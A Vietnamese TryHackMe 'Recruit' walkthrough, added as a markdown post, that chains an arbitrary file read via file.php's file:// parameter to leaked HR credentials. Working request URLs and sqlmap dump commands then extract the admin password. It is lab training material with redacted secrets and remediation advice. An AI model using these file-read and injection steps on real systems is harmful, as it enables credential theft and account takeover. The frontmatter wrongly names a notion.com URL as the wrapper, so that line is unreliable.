@@ -1,0 +1,185 @@
+---
+title: 'Recruit Challenge'
+description: "Endpoint 'xem CV' file.php là lỗi đọc file tùy ý qua wrapper https://app.notion.com; nó làm lộ mail log chỉ đến thông tin HR hardcode trong config.php, và sau khi đăng nhập, ô tìm kiếm ứng viên dính SQL injection dump mật khẩu admin để lấy flag admin."
+date: 2026-05-26
+platform: tryhackme
+room: 'Recruit Challenge'
+roomUrl: 'https://tryhackme.com/room/recruitwebchallenge'
+difficulty: medium
+tags:
+  - 'web'
+  - 'sql-injection'
+  - 'lfi'
+  - 'php'
+  - 'linux'
+vulnClasses:
+  - 'arbitrary file read'
+  - 'hardcoded credentials'
+  - 'sql injection'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Recruit Challenge — Đọc File Tùy Ý sang Rò Rỉ Config sang SQLi Chiếm Admin**
+
+_Bài walkthrough thử thách web "Recruit" trên TryHackMe. Một cổng tuyển dụng lộ ra một endpoint "xem CV" đọc được bất kỳ file nào ta chỉ định thông qua wrapper_ _`file://`_ _của PHP. Ta dùng nó để đọc một mail log nội bộ, log này cho biết thông tin HR nằm trong_ _`config.php`\*\*; ta đọc source của file đó, đăng nhập bằng HR, rồi lợi dụng ô tìm kiếm ứng viên dính SQL injection để dump mật khẩu admin và lấy flag admin._
+
+> Flag và toàn bộ thông tin đăng nhập đã redact. Recruit là thử thách huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên mục tiêu luyện tập hợp pháp. Các giá trị hiển thị dạng `<redacted>` hoặc `THM{<redacted>}` là thật trên máy nhưng được giấu ở đây.
+
+---
+
+### **TL;DR — toàn bộ chuỗi tấn công**
+
+<Callout type="tldr">
+
+`gobuster`/`nikto` đánh dấu `file.php`, một `config.php` đọc được nhưng rỗng, và một `/mail/` bị liệt kê thư mục → `file.php?cv=file:///var/www/html/mail/mail.log` đọc một email nội bộ (**đọc file tùy ý** qua wrapper `file://`) nói rằng _thông tin HR nằm trong_ _`config.php`\*\*, thông tin admin nằm trong database_ → `file.php?cv=file:///var/www/html/config.php` trả về **source** PHP (wrapper đọc chứ không thực thi) để lộ một **`$HR_PASSWORD`** **hardcode** → đăng nhập bằng `hr` → ô tìm kiếm ứng viên ở `dashboard.php?search=` **dính SQL injection** → `sqlmap` dump `recruit_db.users` → **mật khẩu admin** → đăng nhập bằng `admin` → dashboard in ra **flag admin**.
+
+Một lỗi đọc file tìm ra creds; một lỗi injection kết thúc công việc.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+```
+
+`nmap -sC -sV` cho thấy SSH, một DNS server, và một web app Apache "Recruit":
+
+```text
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  |_http-title: Recruit
+```
+
+Dò nội dung lập bản đồ app và nổi lên hai file quan trọng:
+
+```text
+gobuster dir -u http://$IP/ -w .../big.txt -x php,txt,js,bak,html
+# /api.php        (200)
+# /config.php     (200) [Size: 0]      <- empty when executed...
+# /file.php       (200) [Size: 20]     <- a file viewer?
+# /dashboard.php  (302 -> index.php)
+# /phpmyadmin     (301)
+# /mail           (301)                <- directory indexing (nikto flags it)
+# /sitemap.xml    (200)
+```
+
+`nikto` nói thẳng các gợi ý: _"config.php: PHP Config file may contain database IDs and passwords"_ và _"/mail/: Directory indexing found."_ `config.php` trả về **0 byte** trên trình duyệt vì PHP thực thi nó — nhưng điều đó chỉ giấu source khỏi request thông thường, chứ không khỏi một lỗ hổng đọc file.
+
+### **Lỗ hổng —** **`file.php`** **đọc bất kỳ file nào ta chỉ định**
+
+`file.php` nhận một tham số `cv` (một cổng tuyển dụng "xem CV của ứng viên này") và đưa thẳng nó vào một lệnh đọc file. Cung cấp một URL `file://` khiến nó trả về **byte thô** của bất kỳ đường dẫn nào — kể cả source PHP, vốn không bao giờ được thực thi trên đường đi này:
+
+<Callout type="insight">
+
+Wrapper `file://` là toàn bộ mấu chốt. Một request thông thường đến `config.php` chạy PHP và trả về trang rỗng, nên các bí mật trông có vẻ an toàn. Nhưng `file.php?cv=file:///var/www/html/config.php` **đọc file như dữ liệu**, không bao giờ thực thi nó — nên mật khẩu hardcode từng bị "giấu" sau việc thực thi PHP nay quay về dưới dạng plaintext. Một lỗi đọc file tùy ý biến "config rỗng" thành "đây là thông tin đăng nhập."
+
+</Callout>
+
+### **Bước 1 — đọc mail log để tìm manh mối**
+
+`/mail/` bị liệt kê thư mục, và lỗ hổng đọc file cho phép ta lấy mail log phía server:
+
+```text
+http://$IP/file.php?cv=file:///var/www/html/mail/mail.log
+```
+
+Bên trong là một email xác nhận triển khai từ HR gửi IT, nói rõ chính xác các bí mật nằm ở đâu:
+
+```text
+From: HR Team <hr@recruit.thm>
+To: IT Support <it-support@recruit.thm>
+Subject: Recruitment Portal Deployment Confirmation
+
+- HR login credentials (username: hr) are currently stored in the application
+  configuration file (config.php) ...
+- Administrator credentials are NOT stored in the application files and are
+  securely maintained within the backend database.
+```
+
+Đó là bản đồ: **thông tin HR nằm trong** **`config.php`\*\***; thông tin admin nằm trong DB.\*\*
+
+### **Bước 2 — đọc source config.php, lấy mật khẩu HR**
+
+Trỏ chính lỗ hổng đó vào `config.php` qua `file://` để đọc source thay vì thực thi nó:
+
+```text
+http://$IP/file.php?cv=file:///var/www/html/config.php
+# $APP_NAME    = 'Recruit';
+# ...
+# /* HR Credentials (Temporary - Initial Rollout Phase) */
+# $HR_PASSWORD = '<redacted>';
+```
+
+File config thậm chí thừa nhận creds nằm đó "tạm thời cho tiện truy cập." Giờ ta có `hr` / `<redacted>` — và đăng nhập trên trang chủ đưa ta đến `dashboard.php`.
+
+### **Bước 3 — SQL injection trong ô tìm kiếm ứng viên**
+
+Dashboard HR có một ô tìm kiếm ứng viên. Phép thử nhỏ nhất có thể — một ký tự `#` — ném ra lỗi SQL, một dấu hiệu mạnh cho thấy `search` dính injection:
+
+```text
+GET /dashboard.php?search=asd
+```
+
+Lưu request đã xác thực đó và để `sqlmap` làm phần còn lại:
+
+```text
+sqlmap -r request.txt --dbs
+# available databases: information_schema, mysql, performance_schema,
+#                      phpmyadmin, recruit_db, sys
+
+sqlmap -r request.txt -D recruit_db -T users -C password,username --dump
+# +----------------+----------+
+# | password       | username |
+# +----------------+----------+
+# | <redacted>     | admin    |
+# +----------------+----------+
+```
+
+Bảng `users` giữ đúng thông tin mà email đã hứa là "được bảo quản an toàn trong database": tài khoản **admin**, mật khẩu để dạng plaintext.
+
+### **Bước 4 — đăng nhập admin, lấy flag**
+
+Đăng nhập bằng `admin` với mật khẩu vừa dump. Giao diện admin của dashboard in thẳng flag ra:
+
+```text
+http://$IP/dashboard.php
+# Candidate Applications
+# ADMIN Flag:  THM{<redacted>}
+```
+
+Đọc file → mail log → source config → đăng nhập HR → SQLi → mật khẩu admin → flag admin.
+
+### **Tác động**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 8.6** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`). Hai lỗi củng cố lẫn nhau:
+
+- **Đọc file tùy ý** (`file.php` + `file://`) tiết lộ bất kỳ file nào trên server — mã nguồn, config, log — và phá vỡ giả định "PHP thực thi nên source được giấu", làm lộ một credential hardcode.
+- **SQL injection** trên một ô tìm kiếm đã xác thực cho phép rút toàn bộ database, bao gồm mật khẩu plaintext của administrator — tức chiếm trọn tài khoản của ứng dụng.
+
+Khi nối chuỗi, một khách truy cập chưa xác thực đọc được config, trở thành HR, rồi trở thành admin.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Đừng bao giờ dựng đường dẫn file từ input người dùng.** Trong `file.php`, ánh xạ một allow-list các mã CV đến file đã biết, từ chối các wrapper (`file://`, `php://`) và đường dẫn tuyệt đối/`../`, và giữ các file tải lên ngoài web root.
+2. **Đừng lưu thông tin đăng nhập trong source hay config.** Dùng secrets manager hoặc biến môi trường với quyền tối thiểu; mật khẩu "tạm thời cho rollout" là một rủi ro vĩnh viễn.
+3. **Tham số hóa mọi truy vấn.** Ô tìm kiếm phải dùng prepared statement/tham số ràng buộc; đừng bao giờ ghép input request vào SQL.
+4. **Băm mật khẩu** (bcrypt/argon2). DB lưu mật khẩu admin dạng plaintext, biến một lỗi injection thành chiếm quyền tức thì. Đồng thời tắt directory indexing trên `/mail/`.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **"Source không được phục vụ" không phải là bảo vệ.** Một lệnh đọc `file://` trả về byte mà không thực thi PHP — một `config.php` rỗng trên trình duyệt vẫn đọc được trọn vẹn qua một lỗi đọc file.
+- **Đọc những log mà app để vương vãi.** Mail log trao cho ta vị trí chính xác của mọi credential trước cả khi ta chạm vào database.
+- **Một tham số dính injection = cả database.** `sqlmap` biến một trường ném lỗi thành một bản dump đầy đủ, kèm cả mật khẩu admin.
+- **Mật khẩu plaintext khiến mọi thứ dễ dàng.** Băm mật khẩu sẽ buộc phải thêm bước crack; ở đây bản dump _chính là_ thông tin đăng nhập.
+
+Cảm ơn bạn đã đọc. Recruit là lời nhắc gọn gàng rằng một lỗi đọc file tùy ý, cộng với credential để sai chỗ, là đủ để đưa một ứng dụng từ ẩn danh lên administrator.
